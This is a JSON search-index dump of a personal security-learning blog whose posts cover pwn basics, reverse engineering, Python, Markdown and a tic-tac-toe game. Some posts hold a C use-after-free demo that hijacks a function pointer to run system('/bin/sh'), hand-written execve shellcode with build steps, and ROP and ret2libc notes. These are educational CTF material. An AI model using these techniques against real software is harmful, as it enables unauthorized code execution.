&lt;stdlib.h&gt;typedef void (*func_ptr)(char *);void evil_fuc(char command[])&#123;system(command);&#125;void echo(char content[])&#123;printf(&quot;%s&quot;,content);&#125;int main()&#123; func_ptr *p1=(func_ptr*)malloc(4*sizeof(int)); printf(&quot;malloc addr: %p\\n&quot;,p1); p1[3]=echo; p1[3](&quot;hello world\\n&quot;); free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针 p1[3](&quot;hello again\\n&quot;); //p1指针未被置空,虽然free了,但仍可使用.只是其内存块是被标记为空闲状态 func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来. printf(&quot;malloc addr: %p\\n&quot;,p2); printf(&quot;malloc addr: %p\\n&quot;,p1);//p2与p1指针指向的内存为同一地址 p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针. p1[3](&quot;/bin/sh&quot;); return 0;&#125; 最终运行效果： result 漏洞的利用方法原理上与其相同，之后会再加上入群题的解题过程 学习借鉴文章来源：https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn1.2--ret2libc","slug":"pwn-入门1-2","date":"2018-08-28T01:46:58.000Z","updated":"2018-09-25T13:46:32.048Z","comments":true,"path":"2018/08/28/pwn-入门1-2/","link":"","permalink":"http://siriuswhiter.tk/2018/08/28/pwn-入门1-2/","excerpt":"","text":"ret2libc学习 ret2libc使用原因程序不是静态编译，通常就不会有int 0x80sret2syscall 就无法实现，因而使用 ret2library。 调用函数的栈结构布局 ： 调用函数的返回地址 函数调用完的返回地址 调用函数的参数1 调用函数的参数2 利用过程分析：ASLR使得每次载入的函数地址（base）都不同 实际地址 Address = base +offset 若地址为 0xf… 则其为实际地址； offset在libc库中是固定的； 查看libc库版本： 12ldd ./file 寻找偏移地址 ： 1readelf -a /lib32/libc.so.6 | grep gets@ 目标是寻找libc 的 base : 1.通过程序中的其他函数leak 程序libc的实际地址（Address）,base = Address - offset 2.从stack残渣中获取libc地址信息 延迟绑定（没搞清楚，之后再写）函数调用方式： call func@plt –&gt; .got.plt –&gt;.got.plt的值为该func的实际地址（所需address） 使用调用函数的栈结构布局：1. 123456789101112gets()pop1_ret(pop&lt;buf&gt; 然后 return）&lt;buf&gt;system()xxx&lt;buf&gt; 2. 12345678gets()system()&lt;buf&gt;&lt;buf&gt;","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"软件保护/软件破解 及对抗","slug":"软件保护-软件破解-及对抗","date":"2018-08-25T01:30:41.000Z","updated":"2018-09-26T12:34:49.108Z","comments":true,"path":"2018/08/25/软件保护-软件破解-及对抗/","link":"","permalink":"http://siriuswhiter.tk/2018/08/25/软件保护-软件破解-及对抗/","excerpt":"","text":"软件保护简单算法注册保护：输入用户名序列号，计算并检测序列号； 简单算法注册保护的对抗：①修改关键指令：暴力破解；patcher②dll注入或使用加载器（使序列号计算结果展示出来）；内存注册机③还原本身算法；keygen 复杂算法注册保护：通常内置rsa公钥/签名/绑定硬件码/注册信息分段校验/运行时校验等； 复杂算法注册保护的对抗：①patch②补丁修改公钥，使用自己的公钥对； 网络加密及硬件加密：本质上与本地加密相同/运行前检测？？ 网络加密及硬件加密的对抗：①patch②模拟与远程端的通信，及模拟执行；③使用中转程序，从服务器获得远程执行结果； 复杂系统注册保护：以上内容混杂 附：常用–壳（压缩壳/加密壳）：程序运行前的检测，校验/程序注册机制/程序运行二次检测 软件破解及对抗程序分析及对抗： 代码变形mutation； 代码膨胀expansion； 花指令； 代码乱序； 平坦化； 程序调试及对抗： 系统API检测程序是否处于被调试状态； 检测调试器窗口信息、状态码； 检测调试器驱动，符号； 程序执行行为检测（如检测运行时间，时间较长则处于被调试状态）； 利用驱动接管本身程序的中断，阻止被调试器接管； 利用驱动修改内核参数，阻止程序被调试； 双进程反调试； 程序修改及对抗：修改：文件补丁技术及工具；对抗修改： hash校验/内存关键部分CRC校验/ipk劫持等； dnspy：.NET程序逆向工具","categories":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"Hexo Essay Writing","slug":"hexo-essay-writing","date":"2018-08-15T15:33:24.000Z","updated":"2018-09-25T13:46:42.016Z","comments":true,"path":"2018/08/15/hexo-essay-writing/","link":"","permalink":"http://siriuswhiter.tk/2018/08/15/hexo-essay-writing/","excerpt":"","text":"打开git,进入MyBlog目录； 输入 hexo new &quot;essay-name&quot;； 打开source文件夹，找到 essay-name.md，使用markdown语法写作； 执行命令 / hexo clean / hexo generate/ hexo deploy； over； 假如hexo命令出现问题，基本上就是_config.yml 文件的空格有问题，看报错就好了。","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"Markdown standard","slug":"markdown规范学习","date":"2018-08-13T14:46:46.000Z","updated":"2018-09-25T13:48:48.888Z","comments":true,"path":"2018/08/13/markdown规范学习/","link":"","permalink":"http://siriuswhiter.tk/2018/08/13/markdown规范学习/","excerpt":"","text":"MarkDown v1.01.1 全局规范 MarkDown 文件使用‘.md’结尾 （小写字母) 格式规范标题结构格式1.标题与紧贴的’上下正文‘使用’1整行换行‘隔开2.’#’号和文字之间’一个空格’连接3.标题层级最多六级 ‘#’到’######’ 加强和强调规范一般统一使用第一种 12*emphasize*_emphasize_ 使用’~~’给文字添加删除线1~~strikethrough~~ 代码块规范 行内代码使用’一对波浪号’如：hello world! 块级代码使用’三个波浪号’或’整体四空格缩进’，且上下均用整行隔开，如下： 123&lt;?php echo &apos;看源码之三个波浪号&apos;;?&gt; &lt;?php echo &apos;看源码之四空格缩进&apos;; ?&gt; 列表写法 列号’1.’或者’*’后内容用空格隔开 列表块前后’整行隔开’ 如下： 1234561. Windows 2. Mac3. iOS * iPhone * iPad4. Android 实际预览： Windows Mac iOS iPhone iPad Android 123456* Windows * Mac* iOS* Android 1. v3.2 2. v4.1 实际预览： Windows Mac iOS Android v3.2 v4.1 其他标签规范链接和email Inline： 1An [example](http://url.com/ &quot;title&quot;) 实现效果：An example 引用样式标签（titles are optional）: An [example][id].Then,anywhere else in the doc,define the link: [id]:http://example.com/ &quot;title&quot; Email: 1An email &lt;example@example.com&gt; link. 插图Inline(titles are optional)： 1![alt text](/path/img.jpg &quot;title&quot;) 引用式插图： ![alt text][id] [id]:/url/to/img.jpg &quot;title&quot; 引用块及嵌套 Email-style angle bracketsare used for blockquotes. And, they can be nested. Headers in blockquotes You can quote a list. Etc. 内联代码 &lt;code&gt; 段落中的用法 也可以 `代码中包含波浪号`.代码块 Indent every line of a code block by at least 4 spaces or 1 tab.代码的每行都最少用4个空格或者一个制表符(tab) 我是普通文本块 我是一个预格式化的 代码块. 水平分割线三个连字符-: 表格规范一个简单的表格看起来如下： 第一个头部 第二个头部 第三个头部 内容格子 内容格子 内容格子 内容格子 内容格子 内容格子 每列的对齐可以通过在分割线上添加冒号来实现： 第一个头部 第二个头部 第三个头部 左对齐 居中 右对齐 左对齐 居中 右对齐 页内锚标记 点我跳转到顶部 // 利用 #,## 生成 id 锚标签 另一种锚标记 // 利用 &lt;a name=&quot;top&quot;&gt;&lt;/a&gt; 附：参考 Hello-World.md 源码，注意换行的使用 123456789101112131415# Hello-World这是一个范例文件格式我是普通换行## 我是&lt;h2&gt;标题我是`&lt;h2&gt;`的内容## 我是&lt;h3&gt;标题* Windows * Mac* iOS* Android","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"Introduction to pwn1.1","slug":"pwn-入门1-1","date":"2018-08-13T14:35:13.000Z","updated":"2018-09-29T09:15:02.590Z","comments":true,"path":"2018/08/13/pwn-入门1-1/","link":"","permalink":"http://siriuswhiter.tk/2018/08/13/pwn-入门1-1/","excerpt":"","text":"各种变量的存储位置 stack：局部变量 heap: 动态分配内存的变量（malloc/new） bss section: 全局化的未初始化的变量 data section: 全局化的已初始化的变量 rodata: （只读data段）全局化的静态变量（const） 例如： 123456789int a = 0; //.dataint b; //.bssconst double PI = 3.1415 //rodataint main()&#123; int c = 2; //stack char *d = malloc(16); //heap return 0;&#125; linux下将shellcode运行1.手写简易shellcode 123456789101112jmp shrun: pop ebx mov BYTE [ebx+7],0 xor eax,eax mov al,11 xor ecx,ecx xor edx,edx int 0x80sh: call run db &quot;/bin/sh&quot; 2.一系列步骤 123Assembly: nasm a.asm -o a.o -felf32 Extract Shellcode: objcopy -O binary a.o code //将a.o中需要用内容的提取到code中 xxd -i code //将提取出来的code转换为机器码 3.带入调用shellcode的程序test.c #include &quot;code.h&quot; typedef int(*CODE)(); int main() { ((CODE)shellcode)(); } Run Shellcode: gcc test.c -o test -m32 -zexexstack linux下的系统调用. 之前的一些小知识点笔记：gadget :一小段以ret结尾的code rop chain ：串联在一起的gadget rop 类型：控制寄存器做syscall；使用原有程序的func；使用libc里的gadget或func（绕过ASLR）. rop关键： 查找gadget： ROPgadget --binary ./file ROPgadget --binary ret2syscall --only &apos;pop|ret&apos; | grep eax ROPgadget --binary --opcode cd80c3（int 0x80 ; ret ） 排列gadget： peda：vmmap 查看程序段的可读写执行情况 也可以：./file &amp; (后台运行，返回pid0） cat /proc/pid0/maps","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Learning python","slug":"learning-python","date":"2018-08-02T11:11:04.000Z","updated":"2018-09-25T13:43:58.748Z","comments":true,"path":"2018/08/02/learning-python/","link":"","permalink":"http://siriuswhiter.tk/2018/08/02/learning-python/","excerpt":"","text":"最近将之前的博客逐渐搬运过来，因为可怜的服务器要到期了hhh 为了能够完成各色python脚本的编写，迫不得已入门python大法！ 以下为简易的py语法： Python string 对于单个字符的编码，Python提供了ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符； eg： ord(‘A’) -&gt;65 chr(66) -&gt;B 对bytes类型的数据用带b前缀的单引号或双引号表示： x=b’abc’； 可以通过encode() 将Unicode表示的str编码为指定的 bytes； 格式化输出字符串： c语言格式； format 方法’aaaa{0}bbbb{1}cccccc……’.format(para1,para2…)参数会依次取代占位符{0} {1}{…}； python list and tuple list（列表） ：classmates = [‘elementl’, ‘element2’, [‘element31’,’element32’],’element4’] len()得到元素个数； classmates[-n]可以得到倒数第n个元素； classmates.append(‘element’)追加元素到末尾； insert(n,’element’)插入到指定位置； pop()删除末尾元素；pop(i)删除指定位置元素； classmates[n]=’element’直接替换为别的元素； list元素可以是另一个list。 tuple（元组）： classmates = (‘elementl’, ‘element2’, (‘element31’,’element32’),’element4’) 一旦初始化就不能修改（每个元素指向不变），一定程度上相当于const； 获取元素方法与list相同； 当只有一个元素时 t=(1,) 需要使用’，’来消除歧义； tuple中包含list元素时，list中的元素可以变，因为对tuple来说其指向并没有改变。 python dic （同c++map） d = {‘key1’: value1, ‘key2’: value2, ‘key3’: value3} =&gt; d[‘key1’] -&gt;value1 为避免key不存在： ‘key’ in d 不存在则返回False； d.get(‘key’,value) 不存在则返回value； pop(key)可以删除key即对应的value。 python set set也是一组key的集合但不储存value；key不能重复。 创建set需要提供一个list作为输入集合 s = set([1,2,3]); add(key)添加key ；remove(key)删除key。 1234567891011和list比较，dict有以下几个特点： 查找和插入的速度极快，不会随着key的增加而变慢； 需要占用大量的内存，内存浪费多。而list相反： 查找和插入的时间随着元素的增加而增加； 占用空间小，浪费内存很少。所以，dict是用空间来换取时间的一种方法。 python loop for i in list/tuple: 把list或tuple中的每个元素带入i，执行之后缩进块的语句； range()函数可以生成一个整数序列，list(range(n))可以将其转化为list； while xxx： break / continue 同c。 python func 空函数：pass用来做占位符，让代码格式正确。 可以返回多个值，实质上是返回的tuple； None 为不变对象，需要时可以将函数的参数定义为不变对象，这样在每次调用时都是从初始定义的变量开始。（即python函数参数变量默认等于c语言的static，加上none可以去掉static） 12345#Python2.7在一行输入多个数字的方法： 输入一个数字 m = int(raw_input())输入多个数字是 m, n,.... = map(int, raw_input().split()) 可变参数： 函数 def funcname(‘*’args):定义一个参数数量不定的list/tuple L, 调用funcname(L)即可； 关键字参数：函数def funcname(a,b,’‘’‘kw):c为关键字参数（例如用户注册 ab为必填项 c为选填项）；调用时funcname(A,B,e=E,f=F); 命名关键字参数：函数def funcname(a,b,’‘,c,d):’‘后面为命名关键字参数，即选填项只能是定义的key；也可以是 def funcname(a,b,’‘,c,d，e):可变参数c后面的命名关键字参数不必再加’*’；对于前者，调用时funcname(A,B,c=C,d=D); python slice用于取一个list或tuple的部分元素:L = [‘element1’, ‘element2’, ‘element3’, ‘element4’, ‘element5’] slice操作符使用： eg：取前三个元素 L[0:3] /L[:3]；取后两个元素L[-2:]；取倒数第二个元素L[-2:-1]； L[:10:2]前十个数里每两个取一个；L[::5]所有数每五个取一个； python iteration即循环遍历； d = {‘a’: 1, ‘b’: 2, ‘c’: 3} eg: 循环迭代dict： for key in d://默认dict 迭代的是key ；迭代value : for value in d.values()；同时迭代 ：for k,v ind.items() 判断是否可迭代：通过collections模块的Iterable类型判断 12 from collections import Iterable isinstance(objects,Iterable) 下标循环的实现：通过内置的enumerate函数判断 1for i, value in enumerate([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]): python list generationeg： 生成L=[1,4,9,….100]：[x*x for x in range(1,100)]; 筛选出仅偶数的平方：[x*x for x in range(1,100) if x%2 ==0]; 两层循环生成全排列：[m+n for m in &#39;ABC&#39; for n in &#39;DEF&#39; ]; 列出当前目录下所有文件即目录名：import os | [d for d in os.listdir(&#39;.&#39;)]; 把一个list L 中所有字符串变为小写：[s.lower() for s in L]; python genarator不必创建完整的list，节省大量空间；边循环边计算，称为生成器generator； 方法：将列表生成式的[]改为()即可；","categories":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/categories/skills/"}],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"The art 0f deploying shellcode","slug":"the-art-0f-deploying-shellcode","date":"2018-07-26T11:46:22.000Z","updated":"2018-09-25T13:43:49.802Z","comments":true,"path":"2018/07/26/the-art-0f-deploying-shellcode/","link":"","permalink":"http://siriuswhiter.tk/2018/07/26/the-art-0f-deploying-shellcode/","excerpt":"","text":"转移自之前的博客 shellcode布置 将shellcode放在缓冲区中（静态地址），即函数返回地址之前。//shellcode自身可能会被压栈数据破坏，难以动态定位 1 使用jmp esp/call esp 指令作为跳板指令，定位shellcode，使shellcode正好布置在返回地址之后。//前栈帧数据被大范围破坏 2 为尽量避免1,2的缺点，可以使用跳转指令定位shellcode，同时将shellcode布置在缓冲区内。 3 为了使shellcode具有通用性/安全性，通常会在shellcode一开始大范围抬高栈顶，保护自身代码的完整性。 2 某些情况下不允许使用跳板指令，静态地址又不够准确。可以淹没大片内存的情况下，将shellcode布置在一大段nop之后。此时定位shellcode时，只要能够跳进一大片nop之中即可。 2 返回地址距离缓冲区偏移量不确定。若函数返回地址按双字节不定，可以用一片连续的跳转指令的地址来覆盖函数返回地址，只要有其中一个可以成功覆盖，shellcode就能执行。（待理解） 2 按字节错位引起定位失败从而使shellcode无效。使用按字节相同的双字跳转地址，甚至使用堆中的地址，将shellcode用堆扩展的方法放置在相应区域（Heap spray）。（待理解） 2 2 shellcode的编码技术 原因： 所有的字符串函数都会对NULL字节进行限制，通常需要在shellcode中选择特殊的指令避免直接出现NULL字节或字。 有些函数还会要求shellcode必须为可见字符的ASCII值或Unicode值。 基于特征的IDS系统往往会对常见的shellcode进行拦截。 2 2 解决： 编码。先编码使内容达到限制的要求，再构造解码程序放在shellcode开始执行的地方。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]},{"title":"What's PE files?","slug":"what-s-pe-files","date":"2018-07-23T10:29:37.000Z","updated":"2018-10-18T10:44:36.677Z","comments":true,"path":"2018/07/23/what-s-pe-files/","link":"","permalink":"http://siriuswhiter.tk/2018/07/23/what-s-pe-files/","excerpt":"","text":"转移自之前的博客 PE 文件概论PE（portable Executable）windows系统下的可执行文件格式 1 . 32位可执行文件-PE32 ； 64位可执行文件-PE+/PE32+ ，是PE文件的扩展形式。 分类：可执行系列 exe scr ；库系列 dll ocx cpl drv ；驱动程序系列 sys vxd ；对象文件系列 obj （唯一不可执行）。 基本结构 1 DOS头到节区头是PE的头部分； 文件中使用偏移offset，内存中使用VA（virtual address 虚拟地址）表示位置； VA指进程虚拟内存的绝对地址，RVA指从某个基准位置开始的相对地址。 RVA+ImageBase=VA PE头(1) 2 1.DOS头：IMAGE_DOS_HEADER结构体 3 40个字节/ e_magic:DOS签名（4D5A 签名值MZ）/e_lfanew:指示NT头的偏移（小端序标识法） 2.DOS存根（stub）/可选项，大小不固定/DOS环境才会执行 3.NT头： IMAGE_NT_HEADERS结构体 4 F8个字节/三个成员：签名（50450000）+文件头+可选头。 ①文件头：IMAGE_FILE_HEADER结构体 5 该结构体重要成员（设置不正确，程序无法运行） 6 7 8 ②可选头： IMAGE_OPTIONAL_HEADER32 9 （PE头结构体中最大的） 重要成员 10 11 12 ③节区头： IMAGE_SECTION_HEADER 13 不同内存属性访问权限：code rwx /data rw /resource r 14 重要成员 PE头(2) 内存地址与文件偏移间的映射：RVA to RAW（即file offset） 公式：RAW - PointerToRawData = RVA -VirtualAddress RAW = RVA -VirtualAddress + PointerToRawData 15 eg： RVA = 5000 位于第一节区（.text），VA = 1000（该节区内存的的起始地址）， PointerToRawData= 400 （该节区文件的起始地址） 。 RAW = 5000 -1000 +400 =4400. 2.DLL（动态链接库） 不把库包含在程序中，而是单独组成DLL文件，需要时调用即可/更新库时只需要替换DLL文件即可/内存映射使加载后的DLL代码，资源在多个进程中实现共享。 Windows版本不同，环境不同，被调用函数的位置（地址）也不相同。 ①为了确保在所有环境中都能正常调用被调用函数，编译器保存了被调用函数实际地址的位置。PE装载器将被调用函数的地址写到该位置。 ②DLL重定位。DLL的ImageBase默认为1000000，若某个程序使用a.dll与b.dll时，a已被装载到内存的10000000处，PE装载器只能查找其他空白的内存空间，将b装载进去。 ③PE头表示地址用RVA 而不是VA。 3.IAT（Import Address Table 导入地址表）：用来记录程序正在使用库中的哪些函数。","categories":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"diary-20180720","slug":"diary-20180720","date":"2018-07-20T05:30:16.000Z","updated":"2018-10-18T10:02:47.306Z","comments":true,"path":"2018/07/20/diary-20180720/","link":"","permalink":"http://siriuswhiter.tk/2018/07/20/diary-20180720/","excerpt":"","text":"转移自之前的博客或许是因为复习时不怎么使用虚拟机，导致网络的某些配置出现了问题，按照网上的各种方法怎么也搞不好，历经小半天，终于解决。方法如下： 1.到根目录下/etc/network找到interfaces文件 2. vi打开：vi interfaces 此时发现，只有两行： 12auto loiface lo inet loopback 之所以不能联网是因为这个文件不完整。 讲这两行替换为： 123456789101112auto loiface lo inet loopbackauto eth0iface eth0 inet dhcpauto eth1iface eth1 inet dhcpauto eth2iface eth2 inet dhcpauto ath0iface ath0 inet dhcpauto wlan0iface wlan0 inet dhcp 3.退出vi，启动项 /etc/init.d/networking，重启网络连接sudo /etc/init.d/networking restart，就ok了","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"diary-20180517","slug":"diary-20180517","date":"2018-05-17T10:03:55.000Z","updated":"2018-10-18T10:18:49.905Z","comments":true,"path":"2018/05/17/diary-20180517/","link":"","permalink":"http://siriuswhiter.tk/2018/05/17/diary-20180517/","excerpt":"","text":"转移自之前的博客kali在昨天晚上未更新完卡顿，为了睡觉，强制关机(这个真的不是好习惯，未来还会在在这上面栽跟头…）；then，今天开机时在用户名与密码之间无限循环； 寻求各色解法，e.g. vi /etc/profile 但是其文件正常，之后终于在误打误撞中解决。 步骤： (1).png (2).png 进入 recovery mode（也就是纯命令行模式） 输入用户密码 按理说 应该继续 apt-get update -f 但会提示 输入 dpkg –configure -a 完成后重新update 就ok啦","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"Introduction to pwn0.0 --Protection technology","slug":"protection-technology","date":"2018-05-13T12:11:03.000Z","updated":"2018-09-25T13:42:56.132Z","comments":true,"path":"2018/05/13/protection-technology/","link":"","permalink":"http://siriuswhiter.tk/2018/05/13/protection-technology/","excerpt":"","text":"转移自之前的博客 NX保护和DEP保护两个保护措施都有相同点，都是使数据与代码分离，防止恶意代码被执行简单来说就是关闭了堆栈执行权限 NX保护NX保护，全称为 “No eXecute” ，意为 [禁止执行]我对它的理解即为栈上数据区域去除执行权限，就能防止大多数溢出攻击，即一些恶意程式，把自身的恶意指令集放在其他程式的数据储存区并执行。 linux最早的漏洞防护机制nx-stack刚刚出现后就有人想出了突破方法。那就是只有栈是不可执行，而除了栈以外的其他地方还是可以执行的，只要把返回地址执行别的地方就可以。 DEP保护DEP保护，全称为 Data Execution Prevention ，意为 数据执行保护 数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码 主要优点我觉得这种保护技术组要应用于Windows 这种技术的保护方式和NX方式有相同的地方，也就是让堆和堆栈上的内容不可执行。 可帮助防止数据页当作代码执行，从而有效分离数据与代码。可写的不可执行，可执行的不可写。百度百科上有这样一句话： 可以说，溢出是操作系统(应用软件)永远的痛，Windows 7自然也不例外。所谓溢出主要指缓冲区溢出，就是利用系统(应用软件)漏洞从只有Windows和其他程序可以使用的内存位置执行恶意代码从而达到控制系统的目的。如前所述，缓冲区溢出攻击经常在其它程序的内存缓冲区写入可执行的恶意代码，然后诱骗程序执行恶意代码。使用DEP的目的是阻止恶意插入代码的执行，其运行机制是，Windows利用DEP标记只包含数据的内存位置为非可执行(NX)，当应用程序试图从标记为NX的内存位置执行代码时，Windows的DEP逻辑将阻止应用程序这样做，从而达到保护系统防止溢出。 *P.S.好像这部分还分为硬件实施DEP和软件实施DEP，这个坑先留着吧，过些日子理解之后我再来填。 Linux Canary保护Canary ，又名 金丝雀 ，是一个防止溢出修改ret的措施， Canary 是Linux众多安全保护机制中的一种，主要用于 防护栈溢出攻击 。我们知道，在32位系统上，对于栈溢出漏洞，攻击者通常是通过 溢出栈缓冲区 ， 覆盖栈上保存的函数返回地址 来达到 劫持程序执行流 的目的：溢出栈缓冲区劫持方式 1 如上图所示我们只要能够精确计算出需要覆盖的长度是多少，就能精确覆盖ret的地址，达到攻击效果。然而，针对此种攻击情况，如果在函数返回之前，我们能够判断ret地址是否被改写，若被改写则终止程序的执行，便可以有效地应对攻击。如何做到呢？一个很自然的想法是在刚进入函数时，在栈上放置一个标志，在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生。 Linux Canary保护机制 便是如此，如下： 1 攻击者如果要通过栈溢出覆盖ret，则必先覆盖Canary。如果我们能判断Canary前后是否一致，便能够判断是否有攻击行为发生。 注：上述图例仅用于说明，实际上canary并不一定是与栈上保存的BP地址相邻的。 ASLR地址空间布局随机化ASLR ，全称为 Address space layout randomization顾名思义，这个保护措施的主要内容就是把地址给随机化了，用以增加攻击者对地址预测的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。 但是这个措施只是能降低缓冲区溢出攻击的成功率，并不是能完全防止溢出。 关于这个，多的我也说不上来，给几个文章的地址吧。 PIEPIE ，全称为 position-independent executables一般情况下NX和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作PIE。 内存地址随机化机制，有以下三种情况： 1234参数 意义0 表示关闭进程地址空间随机化1 表示将mmap的基址，stack和vdso页面随机化2 表示在1的基础上增加栈（heap）的随机化 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。 FORTIFY这个好像是编译器的保护措施，将函数名改变了，从而达到防止缓冲区溢出的作用。具体的坑emmm等我以后学会了些再来填吧。 系统防护（全）：二进制的保护机制WINDOWS和LINUX的内存防护机制","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"tech","slug":"tech","permalink":"http://siriuswhiter.tk/tags/tech/"}]},{"title":"JavaScript Naughts and Crosses","slug":"javascript-naughts-and-crosses","date":"2018-01-24T05:00:13.000Z","updated":"2018-10-18T10:25:23.617Z","comments":true,"path":"2018/01/24/javascript-naughts-and-crosses/","link":"","permalink":"http://siriuswhiter.tk/2018/01/24/javascript-naughts-and-crosses/","excerpt":"","text":"转移自之前的博客 学习html,js,css一周做了个粗糙的人机井字棋，虽然很丑，但是有彩蛋啊，比如说：黑白图片来自我c语言课设那刷屏的烫烫烫hhh。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;澳门皇家赌场&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;h1&#123;color:blue;&#125;table&#123;background-color:rgb(182,194,154);width:450px;height:450px;&#125;body&#123;background-color:rgb(131,175,155);&#125;&lt;/style&gt;&lt;script type=&quot;text/javascript&quot; &gt;alert(&quot;欢迎来到棋牌室！&quot;);var a=new Array(10)for(var i=0;i&lt;9;i++)a[i]=0;function start()&#123;for(var i=0;i&lt;9;i++)&#123; a[i]=0;document.getElementById(&quot;srci&quot;+String(i)).src=&quot;back.png&quot;;&#125;&#125;coun=0;function restart()&#123;window.location.reload();&#125;function img_change(id)&#123;var x=1;while(x==1)&#123;if(id==&quot;div0&quot;&amp;&amp;a[0]==0)&#123;a[0]=1;document.getElementById(&quot;srci0&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div1&quot;&amp;&amp;a[1]==0)&#123;a[1]=1;document.getElementById(&quot;srci1&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div2&quot;&amp;&amp;a[2]==0)&#123;a[2]=1;document.getElementById(&quot;srci2&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div3&quot;&amp;&amp;a[3]==0)&#123;a[3]=1;document.getElementById(&quot;srci3&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div4&quot;&amp;&amp;a[4]==0)&#123;a[4]=1;document.getElementById(&quot;srci4&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div5&quot;&amp;&amp;a[5]==0)&#123;a[5]=1;document.getElementById(&quot;srci5&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div6&quot;&amp;&amp;a[6]==0)&#123;a[6]=1;document.getElementById(&quot;srci6&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div7&quot;&amp;&amp;a[7]==0)&#123;a[7]=1;document.getElementById(&quot;srci7&quot;).src=&quot;timg.png&quot;;x=0;&#125;else if(id==&quot;div8&quot;&amp;&amp;a[8]==0)&#123;a[8]=1;document.getElementById(&quot;srci8&quot;).src=&quot;timg.png&quot;;x=0;&#125;elsereturn;&#125;if(!(winner()))&#123;coun++;Robots_Time();&#125;if(!(winner())&amp;&amp;coun==9)alert(&quot;draw&quot;);&#125;function Robots_Time()&#123;var z=1;while(z==1)&#123;var ran=Math.random()*9;ran=parseInt(ran);if(a[ran]==0)&#123;a[ran]=2;document.getElementById(&quot;srci&quot;+String(ran)).src=&quot;white.png&quot;;coun++;z=0;&#125;&#125;winner();&#125;function winner()&#123;if(a[0]==2&amp;&amp;a[1]==2&amp;&amp;a[2]==2||a[0]==2&amp;&amp;a[4]==2&amp;&amp;a[8]==2||a[0]==2&amp;&amp;a[3]==2&amp;&amp;a[6]==2)&#123;alert(&quot;You failed&quot;);return 